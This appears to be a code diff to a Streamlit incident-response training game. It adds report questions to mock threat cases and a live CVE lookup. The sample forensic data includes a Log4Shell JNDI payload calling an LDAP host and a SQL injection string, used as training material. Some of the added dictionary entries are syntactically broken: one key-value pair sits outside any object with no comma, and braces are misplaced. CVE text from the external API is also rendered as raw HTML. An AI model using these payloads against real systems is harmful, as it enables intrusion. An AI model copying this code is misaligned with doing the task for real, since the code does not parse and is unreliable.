@@ -28,7 +28,8 @@ MOCK_THREAT_POOL = [
                 "email_headers": "From: accounts-verify@paypa1-support.com\nSubject: Critical Security Alert\nX-Mailer: PHPMailer 5.2.1",
                 "attachment_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
             }
-        }
+        },
+        "ReportQuestions": ["Identify the malicious URL or attachment name:", "How many users interacted with the email?", "What specific indicators of compromise (IOCs) were found?"]
     },
     {
         "ID": "TR-1002", "Severity": "Medium", "Source": "Intra-Probe", "Vector": "Internal Network Scan", "Status": "Active", "lat": 35.6762, "lon": -139.6503, "MITRE": "T1046", "CVE": "N/A", 
@@ -42,6 +43,7 @@ MOCK_THREAT_POOL = [
             "data": "IP 192.168.1.45.54212 > 192.168.1.1.80: Flags [S], seq 12345, win 64240\nIP 192.168.1.45.54213 > 192.168.1.1.443: Flags [S], seq 67890, win 64240"
         }
     },
+    "ReportQuestions": ["Identify the source IP and scanning tool used:", "List critical assets probed during the scan:", "Provide firewall rule recommendations to prevent recurrence:"]
     {
         "ID": "TR-1081", "Severity": "Critical", "Source": "Suricata", "Vector": "Log4Shell RCE", "Status": "Active", "lat": 51.5074, "lon": -0.1278, "MITRE": "T1190", "CVE": "CVE-2021-44228", 
         "Playbook": ["Disable JNDI", "Patch Log4j", "WAF Filter"], "Correct": "Patch Log4j", 
@@ -56,7 +58,8 @@ MOCK_THREAT_POOL = [
                 "user_agent": "${jndi:ldap://104.248.x.x:1389/a}",
                 "path": "/api/v1/auth"
             }
-        }
+            },
+            "ReportQuestions": ["Identify the malicious JNDI string used in the exploit:", "Confirm the library and patch versions involved:", "Was there evidence of data exfiltration following the RCE?"]
     },
     {
         "ID": "TR-1084", "Severity": "Critical", "Source": "Darktrace", "Vector": "MOVEit Transfer Exfil", "Status": "Active", "lat": 40.7128, "lon": -74.0060, "MITRE": "T1190", "CVE": "CVE-2023-34362", 
@@ -68,7 +71,8 @@ MOCK_THREAT_POOL = [
         "Forensics": {
             "type": "SQL_AUDIT",
             "data": "SELECT * FROM guest_users WHERE id = '' OR '1'='1'; --\nUPDATE moveit_files SET status = 'EXFIL_PENDING' WHERE size > 100MB"
-        }
+        },
+        "ReportQuestions": ["Estimated volume of data exfiltrated during the event:", "List the destination IPs associated with the exfiltration:", "Confirm the specific CVE and entry point exploited:"]
     },
     {
         "ID": "TR-1089", "Severity": "Critical", "Source": "GuardDuty", "Vector": "Citrix Bleed", "Status": "Active", "lat": 1.3521, "lon": 103.8198, "MITRE": "T1190", "CVE": "CVE-2023-4966", 
@@ -80,7 +84,8 @@ MOCK_THREAT_POOL = [
         "Forensics": {
             "type": "MEM_DUMP_STRINGS",
             "data": "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1\nHost: citrix.internal\nCookie: session=....[OVERSHARED DATA BUFFER CONTENT]...."
-        }
+        },
+        "ReportQuestions": ["Identify the detection method used to identify the hijacked session:", "List the impacted user accounts found in the audit:", "Verify that all active sessions were cleared after firmware patching:"]
     }
 ]
 
@@ -573,9 +578,17 @@ def render_case_profile(case_data):
     """, unsafe_allow_html=True)
     
     st.divider()
-    st.subheader("Step 8: Write Detailed Incident Report")
-    user_report = st.text_area("Summarize the event, technical steps taken, and lessons learned:", height=200, placeholder="Example: Log4Shell RCE contained by patching Log4j to 2.17. Stakeholders notified via Slack...")
+    st.subheader("Step 8: Final Forensic Incident Report")
+    st.info(f"Complete the required documentation for a {case_data.get('Vector')} incident.")
     
+    questions = case_data.get('ReportQuestions', ["General Summary of the event:", "Technical steps taken:", "Lessons learned:"])
+    user_answers = []
+    for i, q in enumerate(questions):
+        ans = st.text_area(f"DOCUMENTATION POINT: {q}", height=100, key=f"ans_{case_data['ID']}_{i}", placeholder="Enter technical evidence here...")
+        user_answers.append(f"Q: {q}\nA: {ans}")
+
+    user_report = "\n\n".join(user_answers)
+
     if st.button("SUBMIT REPORT FOR AI EVALUATION", type="primary"):
         if len(user_report) < 20:
             st.warning("Report too brief. Please provide more tactical detail for Mastery XP.")
@@ -632,6 +645,25 @@ def ask_ai_charlie(query, threat_context=None):
         if "quota" in error_msg.lower():
             return "Neural Link Error: API Quota exceeded. Please verify your billing/usage limits."
         return "Neural Link Error: Unable to establish connection to AI Charlie. Check network or API quotas."
+
+
+def fetch_cve_details(cve_id: str) -> str:
+    """Fetches live summary data for a specific CVE from the CIRCL API."""
+    if not cve_id or "CVE-" not in cve_id.upper() or "XXXXX" in cve_id:
+        return "No valid CVE identifier found for this threat vector."
+    
+    try:
+        # Using CIRCL API for quick, no-auth access in the demo environment
+        api_url = f"https://cve.circl.lu/api/cve/{cve_id}"
+        with urlopen(api_url, timeout=5) as response:
+            data = json.loads(response.read().decode())
+            if data and "summary" in data:
+                return data["summary"]
+            return "CVE details found in database, but no summary payload was returned."
+    except Exception as e:
+        if "404" in str(e):
+            return f"Intelligence for {cve_id} is not yet available in the external database."
+        return f"Live Intel Fetch Failed: {str(e)}"
 
 
 def render_user_profile() -> None:
@@ -779,6 +811,18 @@ def render_ai_analyst() -> None:
     if col_b.button("💡 HINT", key="hint_btn", use_container_width=True):
         st.session_state.show_hint = not st.session_state.show_hint; st.rerun()
 
+    # Live CVE Threat Intelligence Sidebar Tab
+    with st.sidebar.expander("🔍 CVE THREAT INTEL", expanded=False):
+        cve_id = latest.get('CVE', 'N/A')
+        if cve_id != 'N/A' and "XXXXX" not in cve_id:
+            if st.session_state.get('last_cve_id') != cve_id:
+                st.session_state.cve_intel = fetch_cve_details(cve_id)
+                st.session_state.last_cve_id = cve_id
+            st.markdown(f"<p style='color:#00FF00; font-size:0.8rem; font-weight:bold;'>{cve_id}</p>", unsafe_allow_html=True)
+            st.markdown(f"<p style='color:#FFFFFF; font-size:0.75rem; line-height:1.4;'>{st.session_state.get('cve_intel')}</p>", unsafe_allow_html=True)
+        else:
+            st.write("No external CVE associated with this vector.")
+
     for action in latest.get('Playbook', []):
         if st.sidebar.button(f"EXECUTE: {action}", key=f"act_{latest['ID']}_{action}", use_container_width=True):
             if action == latest.get('Correct'):
@@ -881,6 +925,8 @@ def initialize_session_state() -> None:
         "threat_count": 0,
         "intel_summary": "",
         "last_mitre_id": "",
+        "cve_intel": "",
+        "last_cve_id": "",
         "assets_count": 0,
         "points": 0,
         "prev_rank_idx": 0,
